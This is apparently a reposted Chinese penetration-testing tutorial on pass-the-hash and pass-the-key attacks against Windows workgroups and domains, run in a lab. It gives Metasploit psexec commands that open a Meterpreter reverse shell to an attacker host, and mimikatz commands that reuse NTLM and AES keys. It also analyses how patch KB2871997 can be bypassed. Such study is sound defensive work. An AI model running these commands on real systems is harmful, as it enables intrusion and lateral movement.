> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rhuLYDaQdEz32_lcOPTzDQ)

作者：谢公子

  

CSDN 安全博客专家，擅长渗透测试、Web 安全攻防、红蓝对抗。其自有公众号：谢公子学安全

免责声明：本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安全 + 的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

**哈希传递攻击**攻击****  

哈希传递攻击是基于 NTLM 认证的一种攻击方式。哈希传递攻击的利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用 NTLM 认证的一种缺陷，利用用户的密码哈希值来进行 NTLM 认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器。

**哈希传递攻击适用情况：**

**在工作组环境中：**

*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
    
*   Windows Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。
    

**在域环境中：**

*   只能是域管理员组内用户 (可以是域管理员组内非 administrator 用户) 的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。
    

  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**MSF 进行哈希传递攻击 PtH(工作组)**

有些时候，当我们获取到了某台主机的 administrator 用户的密码哈希值 ，并且该主机的 445 端口打开着。我们则可以利用 exploit/windows/smb/psexec 模块用 MSF 进行远程登录 (哈希传递攻击)。这个是 rhost 可以是一个主机，也可以设置一个网段。

这里目标主机的 WindowsVista 之后的机器，所以只能使用 administrator 用户进行攻击。

**工作组环境，必须是 administrator 用户**

```
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR346vWRBKKRHxQ80CDY8xic6bmLTl4qhiagIEmpeOteZ1Ccef87micv8Cg/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**MSF 进行哈希传递攻击 PtH(域)**

当我们获取到了域管理员组内用户的密码哈希值 ，并且该主机的 445 端口打开着。我们则可以利用 exploit/windows/smb/psexec 模块用 MSF 进行哈希传递攻击。

**域环境，域管理员组内用户即可**

```
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.11
msf exploit(psexec) > set rhost 192.168.10.131
msf exploit(psexec) > set smbuser test   #test用户在域管理员组内，注意这里不需要写域前缀
msf exploit(psexec) > set smbpass AADA8EDA23213C020B0C478392B5469F:51B7F7DCA9302C839E48D039EE37F0D1
msf exploit(psexec) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR1Sozd7ibicvo3fXSoNHM1HgcVf94ORicxXYXeP4iaibYxhUgGPw9RJU5GKw/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**mimikatz 进行哈希传递攻击 PtH(工作组)**

*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
    
*   Windows Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。
    

```
privilege::debug    #先提权
#使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希
```

**Windows Server 2003**

本地管理员：

*   administrator
    
*   xie
    

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRdbz0nWXtMjDic8ibLXvf45lbFY3dPrFNE0bgAolV8b4uPlR79GSHeFnw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRzn28tOhS2q9vAGRqgy8tpCTY6ydI1FTUuOrH4qFliagBu0hicl62rrsg/640?wx_fmt=png)

**Windows Server 2008** 

本地管理员：

*   administrator
    
*   xie
    

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRUFP3QeN4fC9dJ8icWTHhfuJnyJVdkJMQbDRL9W8iaVwaJfD0ZwLn02CQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRghHvAcQtNuZeEyqg2fYZdOEpU1VuC4dwhxv085ptnJuubORbgH8jNg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**mimikatz 进行哈希传递攻击 PtH(域)**

在域环境中，当我们获得了 域管理员组内用户 的 NTLM 哈希值，我们可以使用域内的一台主机用 mimikatz 对域内任何一台机器 (包括域控) 进行哈希传递攻击。执行完命令后，会弹出 CMD 窗口，在弹出的 CMD 窗口我们可以访问域内任何一台机器。前提是我们必须拥有域内任意一台主机的本地管理员权限和域管理员的密码 NTLM 哈希值。

*   域：xie.com
    
*   域控：WIN2008.xie.com
    
*   普通域主机：WIN2003
    
*   域管理员：test
    
*   域普通用户：hack
    

```
privilege::debug    #先提权

#使用域管理员test的NTLM哈希值对域控进行哈希传递攻击,域用户test在域管理员组中
sekurlsa::pth  /user:test  /domain:xie.com  /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRlKcFBdEeVXoQ3jG3TibMicZDLSGsdc2lNw1kicS1qQW4plLbudAfr9BWg/640?wx_fmt=png)

  

在弹出的 cmd 窗口中，使用 wmiexec.vbs 进行验证

```
cscript wmiexec.vbs /shell Win2008
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR0ico3uWHgG8vwiaDWESib3PXoSiaibQrznh3icw6ddI75UnXrX6aZ7lZMezA/640?wx_fmt=png)

  

只有域管理员的 NTLM 哈希值才可以进行哈希传递攻击，域普通用户的 NTLM 哈希值无法进行哈希传递攻击

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRrl5j60CiaIQgxQF31PML3ybdlE1T4ZCcPlbibdV5o23NH3CByZEuibNcg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**使用 AES 进行 Key 传递攻击 (PTK,Pass The Key)**

前提：只适用于域环境，并且目标主机需要安装 KB2871997 补丁

**获取 AES 凭证**

```
privilege::debug
sekurlsa::ekeys          #获取kerberos加密凭证
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRpVMwf9Fdb5szwiaarL5TAO0zic9jl8dQjyjA15BTIW5w3UdOlBo4fYUg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR5It316ialcHLtFmEvVHLLgcO69wvCyN5SAhHg2GO6lRia6nhxdfialriaQ/640?wx_fmt=png)

**利用获得到的 AES256 或 AES128 进行 Key 攻击**

```
privilege::debug
#使用AES-256进行Key传递攻击
sekurlsa::pth /user:administrator /domain:xie.com /aes256:1a39fa07e4c96606b371fe12334848efc60d8b3c4253ce6e0cb1a454c7d42083
#使用AES-128进行Key传递攻击
sekurlsa::pth /user:administrator /domain:xie.com /aes128:4728551c859bbe351e9c11b5d959163e
```

域控未打 KB2871997 补丁前，无法使用 Key 传递攻击

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRAJbf192Iq76q4K917vQFbXfF8FRLMB0uwC6RKaRicMCUQxvpGxnnskQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRCia0AmsnibagWg9bAibtMFlUyKyRD1U1Ys1wJxjxk8HT7MT91K79WGVtA/640?wx_fmt=png)

但是当我在域控上打上 KB2871997 补丁后，Ke 传递攻击仍然无法使用！这里不知道为什么。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXROjwCnUdWSoYz1pXcaHibc59fYIibxhsiary5P2nUphh6Ticcl4S663dlLw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXReyTRwiacZN24cSIxiaSCuKibkDgRoR5EQkEkbmKdgJqbgibCNOGibYiactzQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**更新 KB2871997 补丁产生的影响**  

微软在 2014 年 5 月发布了 KB2871997 和 KB2928120 两个补丁。KB2871997 针对 PTH 攻击，而 KB2928120 针对 GPP(Group Policy Preference)。KB2871997 补丁将使本地帐号不再可以用于远程接入系统，不管是 Network logon 还是 Interactive login。其后果就是：无法通过本地管理员权限对远程计算机使用 Psexec、WMI、smbexec、IPC 等，也无法访问远程主机的文件共享等。

在实际测试中，更新 KB2871997 之后，发现无法使用常规的哈希传递方法进行横向移动，但 administrator(SID=500) 账号例外，使用该账号的散列值依然可以进行哈希传递攻击。这里需要强调的是 SID=500 的账号。即使将 administrator 账号改名，也不会影响 SID 的值。所以，如果攻击者使用 SID 为 500 的账号进行哈希传递攻击，就不会受到 KB2871997 的影响。

**实验**

*   Windows Server 2008R2：192.168.10.20
    
*   域管理员：administrator  、 xie  
    

未打 KB2871997 补丁前，使用 administrator 账号可以成功进行哈希传递攻击，使用管理员账号 xie 无法进行哈希传递攻击。

![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRQ5gLJiaDqnXTUUG935RibeacvnFg7ia9Y9g60aDGXFHwPvKX2kzPomzAw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXReReYXtlTGLVrDSibGB11D4avHz4RxNSWfAVoKfA1QK0kS7sS8IWQBXg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRb129kuj2I1fdTQwuIjic7g4leNYAN6eD0libibLQFHPiauNeNZpWtNawaA/640?wx_fmt=png)

打上 KB2871997 补丁后，使用 administrator 账号依然可以成功进行哈希传递攻击，使用管理员账号 xie 无法进行哈希传递攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRK4MjsRLAaV1rv87QWRZorXNOa7kD7jP3GMcLK7iaSYLukVGmUV5Hkzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRbSO6xt5JDhcOsyG2CyA970aKb0S85HFYC1GGjM2IIvsZFxVuJ4yYSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRcPU0zudpyl0Jax6F3MdMicDdfHsWxFaEypBy9KEoZLbrqbibFXZoyobA/640?wx_fmt=png)

将 administrator 账号重命名为 admin 账号后，由于不存在 administrator 账号了，所以无法使用 administrator 账号进行哈希传递攻击，但是可以使用  admin 账号紧进行哈希传递攻击，因为 admin 账号的 SID 值为 500。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRLpia6mjXvoOFs1nk8XOHQiatLRvAQfsaLlop6OPnHfhtvc12OLxKPzRw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRBtScb2TY6TYTsm0yyfd35tRBnthib4z7uCbCLmKeIEgUUVWUo4HJibHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRlZeIVNMzrib25ibSDI6g8HrwNUWibHNofn57DNzBKtMGicpofBccKKyjKA/640?wx_fmt=png)

修改目标机器的 LocalAccountTokenFilterPolicy 为 1 后，使用普通域管理员账号 xie 也可进行哈希传递攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR16GS688BCI4TQk8lbzHEfgTPzZib5zlSdia5HDarmmXJCBU3m56B7iaxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR4Yuu2FdPrZI9TPTzNls5helPazfPf2iaMEUfKevjjhhu2dRoF2HzOZw/640?wx_fmt=png)

**总结：**其实 KB2871997 的补丁并没有多大的用处，由于在 Windows Vista 时代，微软就通过将 LocalAccountTokenFilterPolicy 值默认设置为 0 来禁止非 administrator 账号的远程连接 (包括哈希传递攻击)，但是 administrator 用户不受影响。即使目标主机更新了 KB2871997 的补丁，仍然可以使用 PID=500 的用户进行哈希传递攻击，而 PID=500 的用户默认为 aministrator，所以仍然可以使用 administrator 用户进行哈希传递攻击。并且在打了 KB2871997 补丁的机器上，通过将 LocalAccountTokenFilterPolicy 设置为 1，也还是可以使用普通管理员账号进行哈希传递攻击。